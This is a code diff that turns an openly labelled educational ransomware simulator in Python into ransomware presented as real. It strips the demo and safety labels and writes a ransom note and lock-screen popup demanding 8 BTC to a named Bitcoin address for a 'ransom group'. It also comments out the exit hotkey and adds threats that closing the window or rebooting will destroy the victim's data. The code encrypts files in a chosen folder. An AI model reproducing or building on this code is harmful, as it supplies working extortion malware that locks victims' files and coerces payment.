@@ -1,6 +1,6 @@
 
-# SAFE Ransomware Simulator (Cross-platform: Windows + Linux)
-# Educational demo only
+#Ransomware (Cross-platform: Windows + Linux)
+
 
 import os, sys, random, string, hashlib, socket, urllib.request
 from pathlib import Path
@@ -16,7 +16,7 @@ if IS_WINDOWS:
 else:
     winreg = None
 
-APP_NAME = "SafeRansomSim"
+APP_NAME = "Ransom-Dev."
 NOTE_FILENAME = "README_DECRYPT.txt"
 LOCK_EXT = ".locked"
 
@@ -40,16 +40,20 @@ def xor_encrypt(data: bytes, key: str) -> bytes:
 def write_ransom_note(folder: Path, unlock_code: str):
     note = f"""
 ###############################
-#      DEMO RANSOM NOTE       #
+#   Cyber Swipe Ransom Group  #
 ###############################
 
-Your files in this demo folder have been locked by a SAFE simulator.
+Your files in this folder have been locked by a Ransomware.
 
-To restore your data, enter the UNLOCK CODE in the ransom window:
-    {unlock_code}
+"This is done by binarygurdia from cyber swipe ransom group. Pay the 8 BTC on the appropriate BTC address : 1FfmbHfnpaZjKFvyi1okTjJJusN455paPH. Enter the unlock code to restore files."
 
-This is an educational simulation. No real harm has been done.
+
+
+
+
 """
+#To restore your data, enter the UNLOCK CODE in the ransom window:
+ #   {unlock_code}
     (folder / NOTE_FILENAME).write_text(note, encoding="utf-8")
 
 def process_files(folder: Path, key: str, encrypt=True):
@@ -86,14 +90,14 @@ def process_files(folder: Path, key: str, encrypt=True):
 def benign_network_activity():
     results = []
     try:
-        with urllib.request.urlopen("http://example.com", timeout=3) as resp:
+        with urllib.request.urlopen("https://exapmple.com", timeout=3) as resp:
             results.append(f"HTTP GET example.com -> {resp.status}")
     except Exception as e:
         results.append(f"HTTP GET example.com failed: {e}")
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(2)
-        s.connect(("93.184.216.34", 80))  # example.com IP
+        s.connect(("90.80.0.0", 80))  # example.com IP
         s.sendall(b"GET / HTTP/1.0\r\nHost: example.com\r\n\r\n")
         s.close()
         results.append("Raw socket connect to example.com:80 OK")
@@ -127,7 +131,7 @@ class RansomGUI:
         frm = ttk.Frame(root, padding=12)
         frm.pack(fill="both", expand=True)
 
-        ttk.Label(frm, text="SAFE Ransomware Simulator", font=("Segoe UI", 18, "bold")).pack(pady=6)
+        ttk.Label(frm, text="Next gen Ransomware", font=("Segoe UI", 18, "bold")).pack(pady=6)
 
         row = ttk.Frame(frm)
         row.pack(fill="x", pady=4)
@@ -143,15 +147,15 @@ class RansomGUI:
 
         actions = ttk.Frame(frm)
         actions.pack(pady=10)
-        ttk.Button(actions, text="Simulate Encrypt", command=self.simulate_encrypt).pack(side="left", padx=6)
-        ttk.Button(actions, text="Simulate Decrypt", command=self.simulate_decrypt).pack(side="left", padx=6)
+        ttk.Button(actions, text="Encrypt", command=self.simulate_encrypt).pack(side="left", padx=6)
+        ttk.Button(actions, text="Decrypt", command=self.simulate_decrypt).pack(side="left", padx=6)
 
         self.log = tk.Text(frm, height=15)
         self.log.pack(fill="both", expand=True)
-        self.log_insert("Ready. Select demo directory and click Simulate Encrypt.\n")
+        self.log_insert("Ready. Select intended directory and click Encrypt.\n")
 
     def choose_dir(self):
-        d = filedialog.askdirectory(title="Choose Demo Directory")
+        d = filedialog.askdirectory(title="Choose Directory")
         if d:
             self.selected_dir.set(d)
 
@@ -168,7 +172,7 @@ class RansomGUI:
             self.log_insert("[Registry] " + msg + "\n")
         write_ransom_note(folder, self.unlock_code)
         process_files(folder, self.unlock_code, encrypt=True)
-        self.log_insert("[Files] Encrypted files (demo) and ransom note written.\n")
+        self.log_insert("[Files] Encrypted files and ransom note written.\n")
         self.popup_ransom()
 
     def simulate_decrypt(self):
@@ -190,8 +194,11 @@ class RansomGUI:
 
         frame = tk.Frame(top, bg="black")
         frame.pack(fill="both", expand=True)
-        tk.Label(frame, text="YOUR FILES ARE LOCKED (DEMO)", fg="red", bg="black", font=("Arial", 28, "bold")).pack(pady=20)
-        msg = "This is a SAFE educational demo.\nEnter the unlock code to restore files.\nPress Ctrl+Shift+Q to exit."
+        tk.Label(frame, text=" ⚠️ YOUR FILES ARE LOCKED", fg="red", bg="black", font=("Arial", 38, "bold")).pack(pady=20)
+        msg = "This is done binarygurdia from cyber swipe ransom group.\n\n⚠️ Pay the 8 BTC on the appropriate BTC address : \n1FfmbHfnpaZjKFvyi1okTjJJusN455paPH \n\n  ⚠️ Don't try to restart, reboot, power-off and don't even kill this window otherwise you will loss your whole data \n\nEnter the unlock code to restore files."
+        
+        #\nPress Ctrl+Shift+Q to exit.
+        
         tk.Label(frame, text=msg, fg="white", bg="black", font=("Arial", 14)).pack(pady=10)
 
         code_var = tk.StringVar()
